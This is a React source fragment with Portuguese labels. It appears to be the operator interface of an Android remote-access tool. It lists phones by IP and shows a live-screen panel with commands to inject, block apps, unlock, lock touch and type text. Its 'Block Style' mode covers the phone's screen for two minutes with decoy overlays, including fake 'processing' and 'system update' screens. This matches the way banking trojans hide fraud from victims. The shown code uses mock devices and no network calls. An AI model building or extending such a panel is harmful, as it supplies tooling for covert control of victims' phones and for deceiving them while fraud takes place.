      <Icon className={`w-3 h-3 shrink-0 mt-0.5 ${green ? "text-[#00ff9d]" : "text-muted-foreground/50"}`} />
      <div>
        <p className="text-[8px] uppercase text-muted-foreground/60 tracking-widest leading-none mb-1">{label}</p>
        <p className={`text-[11px] font-semibold leading-none tabular-nums ${green ? "text-[#00ff9d] drop-shadow-[0_0_4px_rgba(0,255,157,0.5)]" : "text-primary"}`}>
          {liveType === "clock" ? <LiveClock /> :
           liveType === "timer" && sessionStart !== undefined ? <LiveTimer since={sessionStart} /> :
           value}
        </p>
      </div>
    </div>
  );
}

function ToggleRow({ emoji, label, checked, onChange, testId }: {
  emoji: string; label: string; checked: boolean; onChange: () => void; testId: string;
}) {
  return (
    <button type="button" onClick={onChange} data-testid={testId}
      className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg border transition-all text-left
        ${checked
          ? "border-primary/50 bg-primary/10 shadow-[0_0_8px_rgba(0,212,255,0.08)]"
          : "border-white/5 bg-[#0b0f1a] hover:border-primary/25 hover:bg-primary/5"}`}>
      <span className="text-base leading-none shrink-0">{emoji}</span>
      <span className={`flex-1 text-xs font-medium transition-colors ${checked ? "text-primary" : "text-foreground/70"}`}>{label}</span>
      <div className={`w-9 h-5 rounded-full border transition-all flex items-center px-0.5 shrink-0
        ${checked ? "bg-primary border-primary justify-end" : "bg-[#0b0f1a] border-primary/25 justify-start"}`}>
        <div className={`w-4 h-4 rounded-full shadow transition-all ${checked ? "bg-[#0b0f1a]" : "bg-primary/30"}`} />
      </div>
    </button>
  );
}

function Field({ label, placeholder, value, onChange, testId, icon, required }: {
  label: string; placeholder: string; value: string;
  onChange: (v: string) => void; testId: string;
  icon?: React.ReactNode; required?: boolean;
}) {
  return (
    <div>
      <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">
        {label} {required && <span className="text-destructive">*</span>}
      </p>
      <div className="relative">
        {icon && <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground/50">{icon}</span>}
        <Input value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} required={required} data-testid={testId}
          className={`bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 h-8 ${icon ? "pl-7" : ""}`} />
      </div>
    </div>
  );
}

/* ──────────── DeviceListPanel ──────────── */
function DeviceListPanel({ onClose, onSelect }: {
  onClose: () => void;
  onSelect: (d: Device) => void;
}) {
  return (
    <div className="w-[270px] flex-shrink-0 bg-[#0d1220] border-r border-primary/20 flex flex-col z-20 shadow-[4px_0_20px_rgba(0,212,255,0.07)]">
      {/* header */}
      <div className="flex items-center gap-2 px-3 py-2.5 border-b border-primary/15 flex-shrink-0">
        <Smartphone className="w-3.5 h-3.5 text-primary" />
        <span className="font-orbitron text-[11px] font-bold text-primary tracking-widest flex-1">DISPOSITIVOS</span>
        <span className="text-[9px] text-muted-foreground/50 font-mono">
          {MOCK_DEVICES.filter(d => d.online).length}/{MOCK_DEVICES.length}
        </span>
        <button onClick={onClose}
          className="w-6 h-6 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 transition-all ml-1">
          <X className="w-3 h-3" />
        </button>
      </div>

      {/* device list */}
      <div className="flex-1 overflow-y-auto p-2 space-y-1.5">
        {MOCK_DEVICES.map(d => (
          <button key={d.id} onClick={() => onSelect(d)}
            className="w-full flex items-center gap-2.5 px-2.5 py-2.5 rounded-lg border border-primary/15 bg-[#0b0f1a] hover:border-primary/40 hover:bg-primary/5 transition-all text-left group">
            {/* device icon */}
            <div className={`w-9 h-9 rounded-lg border flex items-center justify-center shrink-0 transition-all
              ${d.online ? "bg-primary/10 border-primary/30 group-hover:border-primary/60" : "bg-white/3 border-white/10"}`}>
              <Smartphone className={`w-4 h-4 ${d.online ? "text-primary" : "text-muted-foreground/30"}`} />
            </div>

            <div className="flex-1 min-w-0">
              <p className="text-[11px] font-semibold text-foreground truncate">{d.name}</p>
              <p className="text-[9px] text-muted-foreground font-mono mt-0.5">
                {d.ip} · Android {d.androidVersion}
              </p>
            </div>

            <div className="flex flex-col items-end gap-1 shrink-0">
              <span className={`flex items-center gap-1 text-[8px] font-orbitron ${d.online ? "text-[#00ff9d]" : "text-muted-foreground/40"}`}>
                <span className={`w-1.5 h-1.5 rounded-full ${d.online ? "bg-[#00ff9d] shadow-[0_0_4px_#00ff9d] animate-pulse" : "bg-muted-foreground/30"}`} />
                {d.online ? "ONLINE" : "OFFLINE"}
              </span>
              <span className="text-[8px] text-muted-foreground/50 flex items-center gap-0.5">
                <Battery className="w-2.5 h-2.5" />{d.battery}%
              </span>
            </div>
          </button>
        ))}
      </div>

      <div className="px-3 py-1.5 border-t border-primary/10 flex-shrink-0">
        <p className="text-[8px] text-muted-foreground/35 font-orbitron tracking-widest">
          {MOCK_DEVICES.filter(d => d.online).length} ONLINE · {MOCK_DEVICES.filter(d => !d.online).length} OFFLINE
        </p>
      </div>
    </div>
  );
}

/* ──────────── DeviceControlModal (Live Screen layout) ──────────── */
const LIVE_ICON_GROUPS = [
  [
    { icon: Settings,     tip: "Configurações",   key: "settings"    },
    { icon: Type,         tip: "Auto-texto",      key: "type"        },
    { icon: Camera,       tip: "Screenshot",      key: "screenshot"  },
    { icon: LayoutGrid,   tip: "Apps",            key: "apps"        },
    { icon: Monitor,      tip: "Injetar",         key: "inject"      },
    { icon: Ban,          tip: "Bloquear App",    key: "ban"         },
    { icon: MousePointer, tip: "Cursor",          key: "cursor"      },
    { icon: Square,       tip: "Overlay Cor",     key: "overlay_col" },
  ],
  [
    { icon: LockOpen,     tip: "Desbloquear",     key: "unlock"      },
    { icon: Lock,         tip: "Bloquear Touch",  key: "lock_touch"  },
  ],
  [
    { icon: Keyboard,     tip: "Teclado",         key: "kbd"         },
    { icon: Type,         tip: "Enviar Texto",    key: "kbd_send"    },
  ],
  [
    { icon: Volume2,      tip: "Volume +",        key: "vol_up"      },
    { icon: VolumeX,      tip: "Mudo",            key: "vol_dn"      },
  ],
  [
    { icon: Eye,          tip: "Block Style",     key: "block_style" },
    { icon: Cast,         tip: "Espelhar",        key: "mirror"      },
  ],
] as const;

const BLOCK_STYLE_NAMES = ["Carrinho", "Zeus", "Sistema"] as const;

function DeviceControlModal({ device, onClose }: { device: Device; onClose: () => void }) {
  const [touchBlocked, setTouchBlocked]       = useState(false);
  const [blockStyleActive, setBlockStyleActive] = useState(false);
  const [blockStyleIdx, setBlockStyleIdx]     = useState(0);
  const [blockTimer, setBlockTimer]           = useState(120);
  const [sendText, setSendText]               = useState("");
  const [feedback, setFeedback]               = useState<string | null>(null);

  useEffect(() => {
    if (!blockStyleActive) return;
    if (blockTimer <= 0) { setBlockStyleActive(false); setBlockTimer(120); return; }
    const id = setInterval(() => setBlockTimer(t => t - 1), 1000);
    return () => clearInterval(id);
  }, [blockStyleActive, blockTimer]);

  function toast(msg: string) {
    setFeedback(msg);
    setTimeout(() => setFeedback(null), 2500);
  }

  function handleIcon(key: string) {
    if (key === "lock_touch")   { setTouchBlocked(true);  toast("Touch bloqueado"); }
    else if (key === "unlock")  { setTouchBlocked(false); toast("Dispositivo desbloqueado"); }
    else if (key === "block_style") {
      setBlockStyleActive(true);
      setBlockTimer(120);
      toast(`Block Style: ${BLOCK_STYLE_NAMES[blockStyleIdx]}`);
    }
    else { toast(`${key} enviado ao dispositivo`); }
  }

  const mm = String(Math.floor(blockTimer / 60)).padStart(2, "0");
  const ss = String(blockTimer % 60).padStart(2, "0");

  return (
    <Dialog open onOpenChange={v => { if (!v) onClose(); }}>
      <DialogContent className="bg-[#07090f] border border-primary/30 text-foreground shadow-[0_0_60px_rgba(0,212,255,0.15)] max-w-3xl w-full p-0 overflow-hidden rounded-xl">

        {/* ── Header ── */}
        <div className="flex items-center gap-2.5 px-4 py-2 border-b border-primary/20 bg-[#0d1220]">
          <span className="w-2 h-2 rounded-full bg-[#00ff9d] shadow-[0_0_5px_#00ff9d] animate-pulse shrink-0" />
          <span className="font-orbitron text-[10px] font-bold text-primary tracking-widest">TELA AO VIVO</span>
          <span className="text-primary/20">|</span>
          <span className="text-[11px] text-foreground/70 font-semibold truncate">{device.name}</span>
          <span className="text-primary/20">|</span>
          <span className="text-[10px] text-muted-foreground/50 font-mono">{device.ip}</span>
          <span className="text-primary/20">|</span>
          <span className="text-[10px] text-muted-foreground/50 font-mono">Android {device.androidVersion}</span>
          <div className="flex-1" />
          {touchBlocked && (
            <span className="flex items-center gap-1 px-2 py-0.5 rounded border border-amber-500/40 bg-amber-500/10 text-[8px] font-orbitron text-amber-400 shrink-0">
              <Lock className="w-2.5 h-2.5" />TOUCH BLOQUEADO
            </span>
          )}
          {blockStyleActive && (
            <span className="flex items-center gap-1 px-2 py-0.5 rounded border border-cyan-500/40 bg-cyan-500/10 text-[8px] font-orbitron text-cyan-400 shrink-0">
              <Eye className="w-2.5 h-2.5" />BLOCK STYLE {mm}:{ss}
            </span>
          )}
          <span className="flex items-center gap-1 text-[9px] text-muted-foreground/50 shrink-0">
            <Battery className="w-3 h-3" />{device.battery}%
          </span>
          <button title="Pausar" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary hover:border-primary/50 transition-all">
            <Pause className="w-3.5 h-3.5" />
          </button>
          <button onClick={onClose} className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 transition-all">
            <X className="w-3.5 h-3.5" />
          </button>
        </div>

        {/* ── Body: icon strip + live screen ── */}
        <div className="flex" style={{ height: "400px" }}>

          {/* Left icon strip */}
          <div className="w-[50px] bg-[#0b0e18] border-r border-primary/15 flex flex-col items-center py-2 overflow-y-auto shrink-0 gap-0.5">
            {LIVE_ICON_GROUPS.map((group, gi) => (
              <div key={gi} className="w-full flex flex-col items-center gap-0.5">
                {gi > 0 && <div className="w-7 h-px bg-primary/15 my-1" />}
                {group.map(({ icon: Icon, tip, key }) => {
                  const isActive =
                    (key === "lock_touch"  && touchBlocked) ||
                    (key === "block_style" && blockStyleActive);
                  return (
                    <button key={key} title={tip} onClick={() => handleIcon(key)}
                      className={`w-9 h-9 rounded-lg flex items-center justify-center transition-all group
                        ${isActive
                          ? key === "lock_touch"
                            ? "bg-amber-500/20 border border-amber-500/50"
                            : "bg-cyan-500/20 border border-cyan-500/50"
                          : "hover:bg-primary/10 border border-transparent hover:border-primary/25"}`}>
                      <Icon className={`w-4 h-4 transition-all
                        ${key === "lock_touch"
                          ? isActive ? "text-amber-400 drop-shadow-[0_0_5px_rgba(245,158,11,0.9)]" : "text-amber-400/50 group-hover:text-amber-400"
                          : key === "unlock"
                          ? "text-[#00ff9d]/55 group-hover:text-[#00ff9d] group-hover:drop-shadow-[0_0_5px_rgba(0,255,157,0.8)]"
                          : key === "block_style"
                          ? isActive ? "text-cyan-400 drop-shadow-[0_0_5px_rgba(34,211,238,0.9)]" : "text-cyan-400/50 group-hover:text-cyan-400"
                          : "text-primary/40 group-hover:text-primary group-hover:drop-shadow-[0_0_4px_rgba(0,212,255,0.7)]"}`} />
                    </button>
                  );
                })}
              </div>
            ))}
          </div>

          {/* Live screen area */}
          <div className="flex-1 bg-[#050709] relative overflow-hidden flex items-center justify-center">

            {/* Block Style overlay */}
            {blockStyleActive && (
              <div className="absolute inset-0 z-20 flex flex-col items-center justify-center bg-black/95">
                <BlockStyleOverlay index={blockStyleIdx} />
                <div className="absolute bottom-5 flex flex-col items-center gap-2.5">
                  <div className="font-orbitron text-3xl font-bold text-primary tabular-nums"
                    style={{ textShadow: "0 0 20px rgba(0,212,255,0.9)" }}>
                    {mm}:{ss}
                  </div>
                  <div className="flex gap-2">
                    <button
                      onClick={() => {
                        const next = (blockStyleIdx + 1) % BLOCK_STYLE_NAMES.length;
                        setBlockStyleIdx(next);
                        setBlockTimer(120);
                        toast(`Overlay: ${BLOCK_STYLE_NAMES[next]}`);
                      }}
                      className="h-7 px-3 rounded border border-primary/40 bg-primary/10 text-[9px] font-orbitron text-primary hover:bg-primary/20 transition-all">
                      GERAR NOVA TELA
                    </button>
                    <button
                      onClick={() => { setBlockStyleActive(false); setBlockTimer(120); toast("Block Style desativado"); }}
                      className="h-7 px-3 rounded border border-red-500/40 bg-red-500/10 text-[9px] font-orbitron text-red-400 hover:bg-red-500/20 transition-all">
                      CANCELAR
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* Connecting placeholder */}
            <div className="flex flex-col items-center gap-4 select-none pointer-events-none">
              <div className="relative">
                <Monitor className="w-14 h-14 text-primary/20" />
                <div className="absolute inset-0 animate-ping opacity-10">
                  <Monitor className="w-14 h-14 text-primary" />
                </div>
              </div>
              <div className="flex flex-col items-center gap-2">
                <p className="text-[10px] font-orbitron text-primary/25 tracking-widest">AGUARDANDO STREAM</p>
                <div className="flex gap-1.5">
                  {[0,1,2].map(i => (
                    <span key={i} className="w-1.5 h-1.5 rounded-full bg-primary/20 animate-pulse"
                      style={{ animationDelay: `${i * 300}ms` }} />
                  ))}
                </div>
              </div>
            </div>

            {/* Feedback toast */}
            {feedback && (
              <div className="absolute top-3 inset-x-0 flex justify-center z-30 pointer-events-none">
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-primary/40 bg-[#0d1220]/95 backdrop-blur-sm text-[10px] font-orbitron text-primary shadow-[0_0_12px_rgba(0,212,255,0.25)]">
                  <Zap className="w-3 h-3 shrink-0" />{feedback}
                </div>
              </div>
            )}
          </div>
        </div>

        {/* ── Bottom send-text bar ── */}
        <div className="flex items-center gap-2 px-3 py-2 border-t border-primary/15 bg-[#0d1220]">
          <button title="Menu" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary transition-all text-sm">≡</button>
          <button title="Home" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary transition-all text-sm">⌂</button>
          <button title="Voltar" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary transition-all">
            <ChevronLeft className="w-3.5 h-3.5" />
          </button>
          <input
            value={sendText}
            onChange={e => setSendText(e.target.value)}
            onKeyDown={e => { if (e.key === "Enter" && sendText) { toast(`Texto enviado: "${sendText}"`); setSendText(""); } }}
            placeholder="Enviar texto..."
            className="flex-1 h-7 bg-[#0b0f1a] border border-primary/20 rounded text-[11px] px-3 text-foreground placeholder:text-muted-foreground/30 focus:outline-none focus:border-primary/50 font-mono"
          />
          <button
            onClick={() => { if (sendText) { toast(`Texto enviado: "${sendText}"`); setSendText(""); } }}
            className="h-7 px-3 rounded border border-primary/30 bg-primary/10 text-[9px] font-orbitron text-primary hover:bg-primary/20 transition-all">
            SEND
          </button>
        </div>

      </DialogContent>
    </Dialog>
  );
}

/* ──────────── Block Style Overlays ──────────── */
function BlockStyleOverlay({ index }: { index: number }) {
  if (index === 1) return <ZeusOverlay />;
  if (index === 2) return <SystemUpdateOverlay />;
  return <CartOverlay />;
}

function CartOverlay() {
  return (
    <div className="flex flex-col items-center gap-8">
      <div className="relative">
        <div className="w-28 h-28 rounded-full border-2 border-primary/20 bg-primary/5 flex items-center justify-center">
          <ShoppingCart className="w-14 h-14 text-primary"
            style={{ filter: "drop-shadow(0 0 12px rgba(0,212,255,0.9))", animation: "pulse 1.2s ease-in-out infinite" }} />
        </div>
        {/* spinning orbit */}
        <div className="absolute inset-[-16px] rounded-full border border-primary/20 animate-spin" style={{ animationDuration: "2.5s" }}>
          <div className="absolute top-0 left-1/2 -translate-x-1/2 -translate-y-1/2 w-2.5 h-2.5 rounded-full bg-primary shadow-[0_0_8px_rgba(0,212,255,1)]" />
        </div>
        <div className="absolute inset-[-28px] rounded-full border border-primary/10 animate-spin" style={{ animationDuration: "4s", animationDirection: "reverse" }}>
          <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 w-1.5 h-1.5 rounded-full bg-primary/60 shadow-[0_0_5px_rgba(0,212,255,0.8)]" />
        </div>
      </div>
      <div className="text-center space-y-1">
        <p className="font-orbitron text-base font-bold text-primary tracking-widest" style={{ textShadow: "0 0 12px rgba(0,212,255,0.8)" }}>PROCESSANDO</p>
        <p className="text-[11px] text-primary/40 font-mono">Aguarde a operação...</p>
      </div>
    </div>
  );
}

function ZeusOverlay() {
  return (
    <div className="flex flex-col items-center gap-8">
      <div className="relative flex items-center justify-center">
        {[0,1,2,3].map(i => (
          <div key={i} className="absolute rounded-full border border-primary/15 animate-ping"
            style={{ width: `${80 + i * 24}px`, height: `${80 + i * 24}px`, animationDelay: `${i * 200}ms`, animationDuration: "1.6s" }} />
        ))}
        <Zap className="w-16 h-16 text-primary relative z-10"
          style={{ filter: "drop-shadow(0 0 18px rgba(0,212,255,1))", animation: "pulse 0.8s ease-in-out infinite" }} />
      </div>
      <div className="text-center space-y-3">
        <p className="font-orbitron text-lg font-bold text-primary tracking-widest" style={{ textShadow: "0 0 15px rgba(0,212,255,0.9)" }}>ZEUS SYSTEM</p>
        <div className="w-52 h-1.5 bg-primary/10 rounded-full overflow-hidden mx-auto">
          <div className="h-full bg-primary rounded-full animate-pulse" style={{ width: "65%" }} />
        </div>
        <p className="text-[10px] text-primary/40 font-mono">Sincronizando...</p>
      </div>
    </div>
  );
}

function SystemUpdateOverlay() {
  return (
    <div className="flex flex-col items-center gap-6 w-72">
      <Shield className="w-14 h-14 text-primary" style={{ filter: "drop-shadow(0 0 12px rgba(0,212,255,0.8))", animation: "pulse 1.5s ease-in-out infinite" }} />
      <div className="text-center">
        <p className="font-orbitron text-sm font-bold text-primary tracking-widest" style={{ textShadow: "0 0 10px rgba(0,212,255,0.8)" }}>ATUALIZANDO SISTEMA</p>
      </div>
      <div className="w-full space-y-3">
        {(["Verificando pacotes", "Baixando atualização", "Instalando módulos"] as const).map((s, i) => (
          <div key={s} className="flex items-center gap-3">
            <div className="w-3.5 h-3.5 rounded-full border border-primary/40 flex items-center justify-center shrink-0">
              <div className="w-2 h-2 rounded-full bg-primary animate-pulse" style={{ animationDelay: `${i * 400}ms` }} />
            </div>
            <div className="flex-1">
              <p className="text-[9px] text-primary/50 font-mono mb-1">{s}</p>
              <div className="h-1 bg-primary/10 rounded-full overflow-hidden">
                <div className="h-full bg-primary/70 rounded-full animate-pulse"
                  style={{ width: `${[100, 70, 35][i]}%`, animationDelay: `${i * 300}ms` }} />
              </div>
            </div>
            <span className="text-[9px] text-primary/40 font-mono shrink-0">{["✓", "...", ""][i]}</span>
          </div>
        ))}
      </div>
    </div>
  );
}
